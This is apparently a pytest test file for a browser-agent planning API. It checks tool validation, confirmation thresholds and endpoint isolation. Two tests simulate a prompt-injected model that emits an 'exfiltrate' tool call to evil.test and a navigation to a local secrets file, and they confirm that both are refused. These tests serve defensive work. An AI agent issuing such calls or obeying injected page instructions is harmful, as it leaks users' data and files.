import pytest
from fastapi.testclient import TestClient

from app.main import app
from app.services.agent_planner_service import AgentPlannerService, agent_planner_service
from app.services.agent_tool_registry import TOOLS_BY_NAME

client = TestClient(app)

SAMPLE_STATE = {
    "url": "https://example.test/login",
    "title": "Login",
    "elements": [
        {"id": "e1", "role": "textbox", "name": "Username"},
        {"id": "e2", "role": "button", "name": "Sign in"},
    ],
    "focusedElementId": None,
    "dialogs": [],
    "validationErrors": [],
    "selectedElementIds": [],
    "truncated": False,
}


@pytest.fixture
def configured_planner(monkeypatch):
    """Pretend the LLM is configured without making a network call."""
    monkeypatch.setattr(AgentPlannerService, "is_configured", property(lambda self: True))


def _plan_body(goal="sign in"):
    return {
        "goal": goal,
        "working_memory": {"goal": goal},
        "page_state": SAMPLE_STATE,
    }


def test_empty_goal_is_rejected():
    response = client.post("/api/v1/agent/plan", json=_plan_body(goal="   "))
    assert response.status_code == 400


def test_planner_unavailable_without_api_key(monkeypatch):
    monkeypatch.setattr(AgentPlannerService, "is_configured", property(lambda self: False))
    response = client.post("/api/v1/agent/plan", json=_plan_body())
    assert response.status_code == 503
    assert "OPENCODE_ZEN_API_KEY" in response.json()["detail"]


def test_valid_plan_is_returned(configured_planner, monkeypatch):
    async def fake_call(self, messages):
        assert messages[0]["role"] == "system"
        return '{"tool": "click", "arguments": {"target": "e2"}, "confidence": 0.91, "reason": "sign in button"}'

    monkeypatch.setattr(AgentPlannerService, "_call_model", fake_call)

    response = client.post("/api/v1/agent/plan", json=_plan_body())
    assert response.status_code == 200
    body = response.json()
    assert body["tool_call"] == {"tool": "click", "arguments": {"target": "e2"}, "requires_approval": False}
    assert body["tool_calls"] == [body["tool_call"]]
    assert body["confidence"] == 0.91
    assert body["needs_user_confirmation"] is False


def test_low_confidence_requests_user_confirmation(configured_planner, monkeypatch):
    async def fake_call(self, messages):
        return '{"tool": "click", "arguments": {"target": "e2"}, "confidence": 0.2}'

    monkeypatch.setattr(AgentPlannerService, "_call_model", fake_call)

    body = client.post("/api/v1/agent/plan", json=_plan_body()).json()
    assert body["needs_user_confirmation"] is True


def test_hallucinated_element_id_returns_422(configured_planner, monkeypatch):
    async def fake_call(self, messages):
        return '{"tool": "click", "arguments": {"target": "e999"}, "confidence": 0.99}'

    monkeypatch.setattr(AgentPlannerService, "_call_model", fake_call)

    response = client.post("/api/v1/agent/plan", json=_plan_body())
    assert response.status_code == 422
    assert "unknown element" in response.json()["detail"]


def test_prose_only_reply_returns_422(configured_planner, monkeypatch):
    async def fake_call(self, messages):
        return "I think you should click the sign in button."

    monkeypatch.setattr(AgentPlannerService, "_call_model", fake_call)

    assert client.post("/api/v1/agent/plan", json=_plan_body()).status_code == 422


def test_injected_page_instruction_cannot_widen_the_tool_set(configured_planner, monkeypatch):
    """
    Even if a hostile page convinces the model to emit an unlisted tool, the
    registry refuses it — the browser never sees the call.
    """

    async def fake_call(self, messages):
        return '{"tool": "exfiltrate", "arguments": {"url": "https://evil.test"}, "confidence": 1.0}'

    monkeypatch.setattr(AgentPlannerService, "_call_model", fake_call)

    response = client.post("/api/v1/agent/plan", json=_plan_body())
    assert response.status_code == 422
    assert "Unknown tool" in response.json()["detail"]


def test_injected_navigation_to_file_scheme_is_refused(configured_planner, monkeypatch):
    async def fake_call(self, messages):
        return '{"tool": "navigate", "arguments": {"url": "file:///C:/Users/secrets.txt"}, "confidence": 1.0}'

    monkeypatch.setattr(AgentPlannerService, "_call_model", fake_call)

    assert client.post("/api/v1/agent/plan", json=_plan_body()).status_code == 422


def test_tools_endpoint_lists_the_registry():
    response = client.get("/api/v1/agent/tools")
    assert response.status_code == 200
    names = {tool["name"] for tool in response.json()}
    assert names == set(TOOLS_BY_NAME)


def test_agent_router_does_not_disturb_the_manual_scan_endpoint():
    """Endpoint isolation: the manual Scan Page route still behaves as before."""
    response = client.post(
        "/api/v1/security/check-webpage",
        json={
            "visible_text": "A perfectly ordinary paragraph about cats.",
            "hidden_text": "",
            "html_comments": "",
            "meta_tags": "",
            "input_values": "",
            "page_title": "Cats",
            "url": "https://example.test",
        },
    )
    assert response.status_code == 200
    assert response.json()["allowed"] is True
    assert response.json()["source"] == "webpage_content"


def test_planner_singleton_is_exported():
    assert isinstance(agent_planner_service, AgentPlannerService)
